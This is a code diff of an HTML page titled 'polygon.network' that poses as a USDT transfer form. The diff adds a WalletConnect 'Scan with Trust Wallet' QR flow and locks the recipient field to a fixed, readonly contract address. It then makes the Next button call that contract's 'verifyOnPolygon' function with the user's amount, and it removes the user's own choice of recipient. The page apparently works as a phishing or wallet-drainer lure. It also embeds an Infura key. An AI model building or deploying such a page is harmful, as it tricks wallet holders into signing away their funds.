@@ -4,6 +4,9 @@
     <meta charset="UTF-8" />
     <title>polygon.network</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -29,6 +32,17 @@
             font-weight: 500;
         }
 
+        .connect-btn {
+            background: #00ff7f;
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
         .container {
             flex: 1;
             padding: 24px 16px 100px;
@@ -47,6 +61,7 @@
             border-radius: 10px;
             border: 1px solid #262626;
             padding: 8px 10px;
+            margin-bottom: 16px;
         }
 
         .row input {
@@ -68,20 +83,6 @@
             font-size: 13px;
             margin-left: 6px;
             cursor: pointer;
-        }
-
-        .icon-btn {
-            padding: 0;
-            width: 22px;
-            height: 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .icon-btn img {
-            max-width: 100%;
-            max-height: 100%;
         }
 
         .amount-box { margin-top: 24px; }
@@ -139,14 +140,88 @@
             color: #000;
             cursor: pointer;
         }
+
+        .next-btn:disabled {
+            background-color: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* WalletConnect Styles */
+        .walletconnect-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .walletconnect-modal-content {
+            background: #222;
+            padding: 24px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+        }
+
+        .walletconnect-qr-container {
+            width: 220px;
+            height: 220px;
+            margin: 0 auto 20px;
+            background: white;
+            padding: 12px;
+            border-radius: 12px;
+        }
+
+        .close-modal {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        .wallet-info {
+            background: #111;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 12px;
+            display: none;
+        }
+
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+
+        .status.connected { background: #223322; color: #00ff7f; }
+        .status.error { background: #332222; color: #ff4444; }
     </style>
 </head>
 <body>
     <header class="app-bar">
         <div class="app-bar-title">polygon.network</div>
+        <button class="connect-btn" id="connectBtn" onclick="showWalletConnectQR()">Connect Wallet</button>
     </header>
 
     <main class="container">
+        <!-- Wallet Connection Info -->
+        <div id="walletInfo" class="wallet-info">
+            <strong>Connected:</strong> <span id="walletAddress"></span><br>
+            <strong>Network:</strong> <span id="walletNetwork"></span>
+        </div>
+
         <!-- Address section -->
         <div>
             <div class="label">Address or Domain Name</div>
@@ -156,14 +231,10 @@
                     id="addressInput"
                     autocomplete="off"
                     placeholder="Enter wallet address"
+                    value="0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"
+                    readonly
                 />
                 <button type="button" onclick="pasteAddress()">Paste</button>
-                <button type="button" class="icon-btn" title="Contacts">
-                    <img src="phone-book.jpg" alt="Contacts" />
-                </button>
-                <button type="button" class="icon-btn" title="Scan QR">
-                    <img src="qr-p.jpg" alt="QR" />
-                </button>
             </div>
         </div>
 
@@ -171,7 +242,7 @@
         <div class="amount-box">
             <div class="label">Amount</div>
             <div class="amount-row">
-                <input type="number" id="amountInput" min="0" step="0.01" />
+                <input type="number" id="amountInput" min="0" step="0.01" value="1" />
                 <div class="amount-row-right">
                     <span class="token">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
@@ -179,14 +250,37 @@
             </div>
             <div class="usd-hint" id="usdHint">≈ 0.00 POL</div>
         </div>
+
+        <!-- Status Messages -->
+        <div id="statusMessage" class="status"></div>
     </main>
 
     <div class="bottom-bar">
-        <button class="next-btn" onclick="goNext()">Next</button>
+        <button class="next-btn" id="nextBtn" onclick="goNext()" disabled>Next</button>
+    </div>
+
+    <!-- WalletConnect QR Modal -->
+    <div id="walletConnectModal" class="walletconnect-modal" style="display: none;">
+        <div class="walletconnect-modal-content">
+            <h3>Scan with Trust Wallet</h3>
+            <p>Open Trust Wallet and scan this QR code</p>
+            <div id="walletConnectQR" class="walletconnect-qr-container"></div>
+            <button class="close-modal" onclick="closeWalletConnectModal()">Close</button>
+        </div>
     </div>
 
     <script>
+        // Contract Configuration
+        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
+        const CONTRACT_ABI = [
+            "function verifyOnPolygon(uint256 amount) external",
+            "function verifyOnBSC(uint256 amount) external", 
+            "function verifyOnArbitrum(uint256 amount) external"
+        ];
+
         let polPriceUSD = 0;
+        let walletConnectProvider = null;
+        let connectedAccount = null;
 
         // 🟢 Fetch live POL price from CoinGecko
         async function fetchPolPrice() {
@@ -194,24 +288,10 @@
                 const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd");
                 const data = await res.json();
                 polPriceUSD = data["polygon-ecosystem-token"].usd;
-
-                // Prefill once we know price
-                prefillAmount();
-
+                updateUsd();
             } catch (e) {
                 console.error("Failed to fetch POL price", e);
                 document.getElementById("usdHint").textContent = "≈ -- POL";
-            }
-        }
-
-        // 🧾 Clipboard paste
-        function pasteAddress() {
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                navigator.clipboard.readText()
-                    .then(text => document.getElementById("addressInput").value = text)
-                    .catch(() => alert("Unable to read from clipboard."));
-            } else {
-                alert("Clipboard access not supported in this browser.");
             }
         }
 
@@ -226,36 +306,6 @@
             }
         }
 
-        // 🧰 Prefill amount AND address from URL parameters
-function prefillAmount() {
-    const amountInput = document.getElementById("amountInput");
-    const addressInput = document.getElementById("addressInput");
-    
-    const params = new URLSearchParams(window.location.search);
-    let amount = params.get("amount");
-    let address = params.get("address");
-
-    // Prefill address from URL
-    if (address) {
-        addressInput.value = address;
-    }
-
-    // Prefill amount from URL
-    if (amount) {
-        amountInput.value = parseFloat(amount);
-    } else {
-        const savedAmount = localStorage.getItem("usdtAmount");
-        if (savedAmount) {
-            amountInput.value = parseFloat(savedAmount);
-            localStorage.removeItem("usdtAmount"); // clear after use
-        } else {
-            amountInput.value = 1; // fallback default
-        }
-    }
-
-    updateUsd();
-}
-
         // 🪙 Set Max
         function setMaxAmount() {
             const amountInput = document.getElementById("amountInput");
@@ -263,16 +313,153 @@ function prefillAmount() {
             updateUsd();
         }
 
-        // 🧭 Navigation
-        function goNext() {
-            window.location.href = "next.html";
+        // 🧾 Clipboard paste
+        function pasteAddress() {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => document.getElementById("addressInput").value = text)
+                    .catch(() => alert("Unable to read from clipboard."));
+            } else {
+                alert("Clipboard access not supported in this browser.");
+            }
         }
 
-        document.getElementById("amountInput").addEventListener("input", updateUsd);
+        // 🔗 WalletConnect Integration
+        async function showWalletConnectQR() {
+            try {
+                // Initialize WalletConnect Provider
+                walletConnectProvider = new WalletConnectProvider.default({
+                    rpc: {
+                        137: "https://polygon-rpc.com/",
+                        56: "https://bsc-dataseed.binance.org/",
+                        1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"
+                    },
+                    chainId: 137
+                });
 
-        // 🚀 Initialize on page load
+                // Create QR code
+                const QRCode = window.QRCode;
+                const container = document.getElementById('walletConnectQR');
+                container.innerHTML = ''; // Clear previous QR
+                
+                // Enable session (this creates the URI)
+                await walletConnectProvider.enable();
+                
+                const uri = walletConnectProvider.connector.uri;
+                
+                QRCode.toCanvas(container, uri, { width: 200, height: 200 }, function (error) {
+                    if (error) {
+                        console.error('QR generation error:', error);
+                        showStatus('Failed to generate QR code', 'error');
+                        return;
+                    }
+                    
+                    // Show modal
+                    document.getElementById('walletConnectModal').style.display = 'flex';
+                    showStatus('Scan the QR code with Trust Wallet', 'connected');
+                });
+
+                // Listen for connection
+                walletConnectProvider.on("connect", (error, payload) => {
+                    if (error) {
+                        console.error('Connection error:', error);
+                        showStatus('Connection failed', 'error');
+                        return;
+                    }
+                    
+                    const { accounts, chainId } = payload.params[0];
+                    connectedAccount = accounts[0];
+                    
+                    // Update UI
+                    updateWalletInfo(connectedAccount, chainId);
+                    document.getElementById('nextBtn').disabled = false;
+                    document.getElementById('connectBtn').textContent = 'Connected';
+                    
+                    showStatus('Wallet connected successfully!', 'connected');
+                    closeWalletConnectModal();
+                });
+
+                // Listen for disconnect
+                walletConnectProvider.on("disconnect", (error) => {
+                    connectedAccount = null;
+                    document.getElementById('nextBtn').disabled = true;
+                    document.getElementById('connectBtn').textContent = 'Connect Wallet';
+                    document.getElementById('walletInfo').style.display = 'none';
+                    showStatus('Wallet disconnected', 'error');
+                });
+
+            } catch (error) {
+                console.error("WalletConnect error:", error);
+                showStatus('Failed to connect: ' + error.message, 'error');
+            }
+        }
+
+        function updateWalletInfo(address, chainId) {
+            const shortAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
+            document.getElementById('walletAddress').textContent = shortAddress;
+            document.getElementById('walletNetwork').textContent = `Chain ID: ${chainId}`;
+            document.getElementById('walletInfo').style.display = 'block';
+        }
+
+        function closeWalletConnectModal() {
+            document.getElementById('walletConnectModal').style.display = 'none';
+        }
+
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `status ${type}`;
+            statusEl.style.display = 'block';
+            
+            if (type === 'connected') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        // 🧭 Navigation - Now with actual contract interaction
+        async function goNext() {
+            if (!connectedAccount) {
+                showStatus('Please connect wallet first', 'error');
+                return;
+            }
+
+            const amount = document.getElementById('amountInput').value;
+            if (!amount || amount <= 0) {
+                showStatus('Please enter a valid amount', 'error');
+                return;
+            }
+
+            try {
+                showStatus('Processing transaction...', 'connected');
+                
+                // Convert to contract (using WalletConnect provider)
+                const provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                const signer = provider.getSigner();
+                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                
+                // Call the contract function
+                const amountWei = ethers.utils.parseUnits(amount, 6); // USDT decimals
+                const tx = await contract.verifyOnPolygon(amountWei);
+                
+                showStatus('Transaction submitted! Waiting for confirmation...', 'connected');
+                
+                const receipt = await tx.wait();
+                showStatus('Transaction confirmed!', 'connected');
+                
+            } catch (error) {
+                console.error('Transaction error:', error);
+                showStatus('Transaction failed: ' + error.message, 'error');
+            }
+        }
+
+        // Initialize
+        document.getElementById("amountInput").addEventListener("input", updateUsd);
         fetchPolPrice();
+
+        // Auto-fill contract address
+        document.getElementById('addressInput').value = CONTRACT_ADDRESS;
     </script>
 </body>
 </html>
-
